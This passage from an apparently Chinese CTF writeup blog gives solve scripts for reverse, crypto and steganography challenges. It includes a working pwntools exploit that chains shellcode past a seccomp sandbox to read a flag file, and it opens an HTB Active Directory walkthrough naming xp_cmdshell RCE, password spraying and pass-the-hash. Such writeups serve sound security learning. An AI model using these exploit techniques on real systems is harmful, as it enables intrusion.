class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="literal">True</span></span><br><span class="line">d = <span class="built_in">len</span></span><br><span class="line">G = <span class="built_in">list</span></span><br><span class="line">g = <span class="built_in">range</span></span><br><span class="line">s = <span class="built_in">next</span></span><br><span class="line">R = <span class="built_in">bytes</span></span><br><span class="line">Y = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成器 l(S)（与加密时的相同）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4 解密函数 N</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key, O</span>):</span><br><span class="line">    I = d(key)</span><br><span class="line">    S = G(g(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % I]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    z = l(S)  <span class="comment"># 初始化生成器</span></span><br><span class="line">    n = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">        n.append(k ^ s(z) + <span class="number">2</span>)  <span class="comment"># 用生成器返回的伪随机数解密数据</span></span><br><span class="line">    <span class="keyword">return</span> R(n)  <span class="comment"># 返回解密后的字节对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s, parts_num</span>):</span><br><span class="line">    Q = d(s.decode())  </span><br><span class="line">    S = Q // parts_num </span><br><span class="line">    u = Q % parts_num  </span><br><span class="line">    W = []</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">        T = j + S</span><br><span class="line">        <span class="keyword">if</span> u &gt; <span class="number">0</span>:</span><br><span class="line">            T += <span class="number">1</span>  </span><br><span class="line">            u -= <span class="number">1</span></span><br><span class="line">        W.append(s[j:T])</span><br><span class="line">        j = T</span><br><span class="line">    <span class="keyword">return</span> W  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">U</span>):</span><br><span class="line">    t = <span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span>  </span><br><span class="line">    decrypted_parts = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> U:</span><br><span class="line">        encrypted_bytes = <span class="built_in">bytes</span>.fromhex(part)  </span><br><span class="line">        decrypted_part = N(t, encrypted_bytes) </span><br><span class="line">        decrypted_parts.append(decrypted_part.decode())  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_parts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    U = [</span><br><span class="line">        <span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    flag = decrypt_flag(U)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/coxRB1u5g17MiI56.png!thumbnail" alt="img"></p><p>flag{thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n}</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="cool-book"><a href="#cool-book" class="headerlink" title="cool_book"></a>cool_book</h2><p>mprotect，可以想到shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/VnfkxlVV6q72RqRo.png!thumbnail" alt="img"></p><p>继续读代码，发现有数组越界,可以劫持程序流程，控制返回地址</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Zk4fw8X50IxS3GKS.png!thumbnail" alt="img"></p><p>有沙盒</p><p><img src="https://uploader.shimo.im/f/fkpERjCXyRSJPraS.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MzEyNDMxMTUsImZpbGVHVUlEIjoiZ08zb2RQeU5WbnM2SndxRCIsImlhdCI6MTczMTI0MjgxNSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo5MTM0NDA5N30.KLNsbYR9RjX0zrp5lIjf_ZvUE8WJyWL4gZGilf7odb4" alt="img"></p><p>仅允许使用，open,read,write</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GpRUam5wn2peOYDL.png!thumbnail" alt="img"></p><p>构造read读入orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./cool_book&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;192.168.18.25&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;addr=&quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Heap Address: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;3.exit&quot;</span>, <span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, con</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;input content&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;input idx&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rsp,rbp</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov r8,0x67616c662f</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode5 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode6 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    sub rbp,0x30</span></span><br><span class="line"><span class="string">    jmp rbp</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">shellcode7 = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    add(i, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode6))</span><br><span class="line"></span><br><span class="line">add(<span class="number">43</span>, shellcode7)</span><br><span class="line">add(<span class="number">44</span>, shellcode6)</span><br><span class="line">add(<span class="number">45</span>, shellcode5)</span><br><span class="line">add(<span class="number">46</span>, shellcode4)</span><br><span class="line">add(<span class="number">47</span>, shellcode3)</span><br><span class="line">add(<span class="number">48</span>, shellcode2)</span><br><span class="line">add(<span class="number">49</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyenc"><a href="#babyenc" class="headerlink" title="babyenc"></a>babyenc</h2><p>需要分别解密两段flag</p><p>flag1需要构造恢复n获取</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c1</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117,</span></span><br><span class="line"><span class="meta">    300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224,</span></span><br><span class="line"><span class="meta">    294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531,</span></span><br><span class="line"><span class="meta">    255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835,</span></span><br><span class="line"><span class="meta">    194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">a</span> = pow(c1[<span class="number">0</span>], e[<span class="number">1</span>]) - pow(c1[<span class="number">1</span>], e[<span class="number">0</span>])</span><br><span class="line"><span class="attribute">b</span> = pow(c1[<span class="number">2</span>], e[<span class="number">3</span>]) - pow(c1[<span class="number">3</span>], e[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="attribute">n1</span> = gmpy2.gcd(a, b)</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(long_to_bytes(n1 &gt;&gt; <span class="number">310</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ga6h6FFz2jdktLys.png!thumbnail" alt="img"></p><p>flag2需要利用等式构造还原即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import long_to_bytes</span><br><span class="line"><span class="attribute">from</span> gmpy2 import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> =<span class="meta"> [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="attribute">c2</span> =<span class="meta"> [</span></span><br><span class="line"><span class="meta">    12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364,</span></span><br><span class="line"><span class="meta">    13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">b</span> = c2[<span class="number">0</span>] + c2[<span class="number">1</span>]</span><br><span class="line"><span class="attribute">c</span> = c2[<span class="number">0</span>] * c2[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="attribute">R</span>.&lt;x&gt; = Zmod(n)[] </span><br><span class="line"><span class="attribute">f</span> = x^<span class="number">2</span> - b * x + c</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span>(f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>))</span><br><span class="line"><span class="comment"># [146436625375651639081292195233290471195543268962429]</span></span><br><span class="line"><span class="attribute">result</span> = long_to_bytes(<span class="number">146436625375651639081292195233290471195543268962429</span>)</span><br><span class="line"><span class="attribute">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241111083319749-1158999917.png" alt="img"></p><p>最后将flag拼一块即可：flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Simple-steganography"><a href="#Simple-steganography" class="headerlink" title="Simple_steganography"></a>Simple_steganography</h2><p>首先附件拿7zip打开能看到3个文件，其他的只能看到两个文件，有一个图片被隐藏了</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Pyu7MI0fDjMDvXBk.png!thumbnail" alt="img"></p><p>把图片打开再另存取出来后用foremost跑一下这个图片</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6C4LvOgbOPqtTe07.png!thumbnail" alt="img"></p><p>里面有个000000000.jpg.没啥思路，再看看之前解出压缩包的文件有个hint.txt:a=7,b=35</p><p>可能是猫脸变化，上网搜一下脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as <span class="built_in">np</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def arnold(im_file, a, b, fn):</span><br><span class="line">    img = <span class="built_in">np</span>.<span class="built_in">array</span>(Image.open(im_file))</span><br><span class="line">    <span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span> = img.shape</span><br><span class="line">    res_img = <span class="built_in">np</span>.zeros((<span class="built_in">height</span>, <span class="built_in">width</span>, <span class="built_in">color</span>), dtype=int)</span><br><span class="line">    a_b_plus_1 = a * b + <span class="number">1</span></span><br><span class="line">    negative_b = -b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span>):</span><br><span class="line">            new_j = (a_b_plus_1 * j - a * i) <span class="symbol">%</span> <span class="built_in">height</span></span><br><span class="line">            new_i = (negative_b * j + i) <span class="symbol">%</span> <span class="built_in">width</span></span><br><span class="line">            res_img[new_j, new_i] = img[j, i]</span><br><span class="line">    Image.fromarray(<span class="built_in">np</span>.uint8(res_img)).<span class="built_in">save</span>(fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    a = <span class="number">0x6f6c53</span></span><br><span class="line">    b = <span class="number">0x729e</span></span><br><span class="line">    arnold(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\00000000.jpg&quot;</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="string">&quot;D:\\phpstudy_pro\\WWW\\php\\测试\\000000001.jpg&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能得到后半部分flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/6o6ubzMV4ShGJN2Q.png!thumbnail" alt="img"></p><p>之后把图片文件头16进制放到a.txt,里面用bkcrack工具来进行明文爆破得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">f45dd89f</span> e3e929fb <span class="number">3202</span>ba17</span><br></pre></td></tr></table></figure><p>再利用该工具修改压缩包的密码为123456</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/pgTaL7zQNqp89zu7.png!thumbnail" alt="img"></p><p>解压即可得到flag.png,之后更改一下图片的宽高即可得到前半段flag</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/kEFaQYqpZJzKTp4n.png!thumbnail" alt="img"></p><p>两段flag一拼即可</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Freelancer</title>
      <link href="/posts/8sdfch788.html"/>
      <url>/posts/8sdfch788.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.11.5</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>MSSQL通过xp_cmdshell 实现RCE</li><li>密码喷洒</li><li>滥用GenericWrite</li><li>RBCD约束委派</li><li>PTH传递攻击</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST</span><br><span class="line">Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).</span><br><span class="line">sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =&gt; Operation not permitted</span><br><span class="line">Offending packet: TCP 10.10.16.4:35511 &gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 &lt;mss 1460&gt;</span><br><span class="line">Nmap scan report for 10.10.11.5</span><br><span class="line">Host is up (0.83s latency).</span><br><span class="line">Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.25.5</span><br><span class="line">|_http-title: Did not follow redirect to http://freelancer.htb/</span><br><span class="line">|_http-server-header: nginx/1.25.5</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span 